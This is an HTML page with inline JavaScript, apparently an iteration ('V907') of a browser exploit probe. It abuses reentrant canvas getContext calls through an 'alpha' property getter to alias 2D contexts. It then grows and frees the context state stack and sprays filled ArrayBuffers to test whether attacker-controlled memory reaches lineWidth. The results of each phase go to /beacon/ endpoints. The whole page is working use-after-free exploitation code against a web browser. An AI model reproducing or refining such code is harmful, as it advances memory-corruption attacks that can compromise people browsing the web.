<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V907</title></head>
<body><pre id="out">V907 — state-buffer orphan test (v651-identical P1)</pre>
<script>
'use strict';
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
var _ix=0;
function bk(tag,d){
  var img=_imgs[_ix++]||(new Image());
  img.src='/beacon/V907-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
}

/* P1 is v651's alias phase verbatim (no victim append, spray objects, 99999.5 in getter). */
var c1=document.createElement('canvas');c1.width=1;c1.height=1;
var innerCtx=null;
var opts={};
Object.defineProperty(opts,'alpha',{get:function(){
  innerCtx=c1.getContext('2d');
  innerCtx.lineWidth=99999.5;
  return true;
}});
c1.getContext('bitmaprenderer',opts);

var spray=[];
for(var s=0;s<300;s++){
  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
  spray.push({c:sc,x:sc.getContext('2d')});
}
var aliasIdx=-1;
if(innerCtx){
  innerCtx.lineWidth=55555.5;
  for(var k=0;k<spray.length;k++){
    if(spray[k].x.lineWidth===55555.5){aliasIdx=k;break;}
  }
}
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/V907-'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
b('P1 alias=' + aliasIdx + ' inner=' + (innerCtx?'OK':'NULL'));
say('alias='+aliasIdx);
if(aliasIdx<0){b('DEAD no-alias');}
else {
  var FILL = 4321.7654;
  var trig = 0;
  try {
    if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v907_trig', '0');
    trig = parseInt(localStorage.getItem('v907_trig')) || 0;
  } catch(e) {}
  b('TRIG t=' + trig);

  /* grow stateStack -> B1 (6400B) */
  for(var i=0;i<15;i++){ innerCtx.save(); innerCtx.lineWidth=1000+i; }
  b('P2 grown lw=' + innerCtx.lineWidth);

  if (trig === 0) {
    var o2={}; var fired2=false;
    Object.defineProperty(o2,'alpha',{get:function(){
      if(!fired2){fired2=true;try{c1.getContext('2d');}catch(e){}}
      return true;
    }});
    var bmr2=null;
    try{ bmr2 = c1.getContext('bitmaprenderer', o2); }catch(e){ b('T0-THREW '+e.name); }
    b('T0 bmr2='+(bmr2?'OK':'NULL')+' fired='+fired2);
  } else if (trig === 1) {
    if (spray[aliasIdx] && spray[aliasIdx].c && spray[aliasIdx].c.parentNode) {
      spray[aliasIdx].c.parentNode.removeChild(spray[aliasIdx].c);
    }
    c1 = null;
    for (var g = 0; g < 50; g++) { var junk = new ArrayBuffer(4096); }
    b('T1 removed');
  } else {
    innerCtx.save();
    innerCtx.lineWidth = 7777.7;
    b('T2 realloc lw=' + innerCtx.lineWidth);
  }

  /* AB(6400) all-fill spray */
  var abs=[];
  for(var a=0;a<200;a++){
    var ab=new ArrayBuffer(6400);
    var dv=new DataView(ab);
    for(var o=0;o<6400;o+=8) dv.setFloat64(o,FILL,true);
    abs.push(ab);
  }
  b('P4 abspray n=' + abs.length);

  b('P5-PRE');
  var lw=null;
  try{ lw = innerCtx.lineWidth; }catch(e){ lw='ERR:'+e.name; }
  b('P5 lw=' + lw);

  if (typeof lw === 'number') {
    if (Math.abs(lw-FILL)<0.01) b('VERDICT state-buffer-controlled (fill surfaced!)');
    else if (lw>=1000 && lw<=1100) b('VERDICT state-intact marker=' + lw);
    else if (Math.abs(lw-7777.7)<0.01) b('VERDICT state-intact realloc-value');
    else if (Math.abs(lw-55555.5)<0.01) b('VERDICT state-intact base');
    else b('VERDICT other lw=' + lw);
  } else {
    b('VERDICT crashed-or-err');
  }
  try { localStorage.setItem('v907_trig', String((trig+1)%3)); } catch(e) {}
}
</script></body></html>
